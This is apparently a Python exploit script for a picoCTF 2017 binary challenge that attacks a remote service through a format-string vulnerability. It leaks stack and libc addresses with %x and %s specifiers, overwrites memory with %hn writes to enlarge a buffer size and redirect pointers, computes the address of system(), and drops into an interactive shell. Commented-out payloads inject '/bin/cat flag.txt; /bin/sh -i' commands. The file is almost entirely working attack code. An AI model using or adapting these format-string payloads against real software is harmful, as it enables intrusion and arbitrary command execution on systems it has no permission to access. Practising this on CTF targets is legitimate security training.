import struct, time, telnetlib
from socket import *

def recv_timeout(the_socket,timeout=2):
    the_socket.setblocking(0)
    total_data=[];
    data='';
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break
        elif time.time()-begin > timeout*2:
            break
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    the_socket.setblocking(1)
    return ''.join(total_data)

def indicator(exploit):
  return "ABCD"+exploit+"EFGH"

def value(reply):
  start = reply.index("ABCD")+4
  end = reply.index("EFGH")
  return reply[start:end]

s = socket(AF_INET, SOCK_STREAM)
s.connect(('shell2017.picoctf.com', 44887))

#INFORMATION GATHER
exploit = indicator("%5$x")
s.send(exploit+'\n')
print "tempFlag: 0x"+value(s.recv(2048))
exploit = indicator("%6$x")
s.send(exploit+'\n')
print "input: 0x"+value(s.recv(2048))

#PAYLOAD 1: Calculate stack base address
exploit = indicator("%9$x")
s.send(exploit+'\n')
data = value(s.recv(2048))
base_addr = int(data, 16) - 4*15

#PAYLOAD 2: Write 'flagSize' address to a location
flagSize_addr = hex(base_addr + 4*6)
portion = int(flagSize_addr[-4:], 16)
exploit = "%"+str(portion-0x81)+"x%17$hn"
s.send(exploit+'\n')
recv_timeout(s,5)

#DEBUG 2: Read Written Data
exploit = indicator("%53$x")
s.send(exploit+'\n')
print "flagSize: 0x"+value(s.recv(2048))

#PAYLOD 3: Replace 'flagSize' with 0xffff
exploit = "%"+str(0xffff-0x81)+"x%53$hn"
s.send(exploit+'\n')
recv_timeout(s,5)

#DEBUG 3: Read Written Data
exploit = indicator("%7$x")
s.send(exploit+'\n')
print "flagSize*: "+value(s.recv(2048))


stack_19 = base_addr + 4*18

print
#Write 3rd pointer address
portion = int(hex(stack_19+2)[-4:], 16)
exploit = "\x00"*0x360 #Fill up input
exploit += "%"+str(portion)+"x%18$hn"
s.send(exploit+'\n')
recv_timeout(s)

#PAYLOAD 1: Write PRINTF_PLT to a location
exploit = "\x00"*0x360 #Fill up input
exploit += "%"+str(0x0804)+"x%55$hn"
s.send(exploit+'\n')
recv_timeout(s)

#Write 3rd pointer address
portion = int(hex(stack_19)[-4:], 16)
exploit = "\x00"*0x360 #Fill up input
exploit += "%"+str(portion)+"x%18$hn"
s.send(exploit+'\n')
recv_timeout(s)

#PAYLOAD 1: Write PRINTF_PLT to a location
exploit = "\x00"*0x360 #Fill up input
exploit += "%"+str(0x9970)+"x%55$hn"
s.send(exploit+'\n')
recv_timeout(s)

#Read 3rd pointer address
exploit = indicator("%55$x")
s.send(exploit+'\n')
print "3rd pt: 0x"+value(s.recv(2048))

#Read 4th pointer address
exploit = indicator("%19$x")
s.send(exploit+'\n')
print "4th pt: 0x"+value(s.recv(2048))

#PAYLOAD 2: Get the 'printf' libc address
exploit = indicator("%19$s")
s.send(exploit+'\n')
data = value(s.recv(2048))
data = data[0:4]
printf_libc =''
for c in data:
  printf_libc = hex(ord(c))[2:] + printf_libc
print "printf_libc: 0x"+printf_libc

#Calculate base libc address
base_libc = int(printf_libc, 16) - 0x4cc70
print "base_libc: "+hex(base_libc)

#Calculate 'system' libc address
system_libc = base_libc + 0x3e3e0
print "execve_libc: "+hex(system_libc)


#PAYLOAD 1: Write STRNCPY_PLT to a location
#exploit = "\x00"*0x360 #Fill up input
#exploit += "%"+str(0x998c+1)+"x%55$hn"
#s.send(exploit+'\n')
#recv_timeout(s)

#Read 4th pointer address
#exploit = indicator("%19$x")
#s.send(exploit+'\n')
#print "4th pt: 0x"+value(s.recv(2048))

#portion = hex(execve_libc)[-6:-2]
#print portion
#exploit = "\x00"*0x360 #Fill up input
#exploit += "#; /bin/cat flag.txt; /bin/sh -i #"
#exploit += "%"+str(int(portion,16)-len(exploit)+0x360)+"x%19$hn"
#s.send(exploit+'\n')
#data = recv_timeout(s)
#print "".join(data.split())

#PAYLOD 5: Buffer overflow 'input' into 'tempFlag'
#exploit = "; /bin/cat flag.txt; /bin/sh -i #";
#exploit += "\x00"*(0x360-len(exploit)) #Fill up input
#exploit += "; /bin/cat flag.txt; /bin/sh -i #";
#s.send(exploit+'\n')
#print s.recv(2048)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
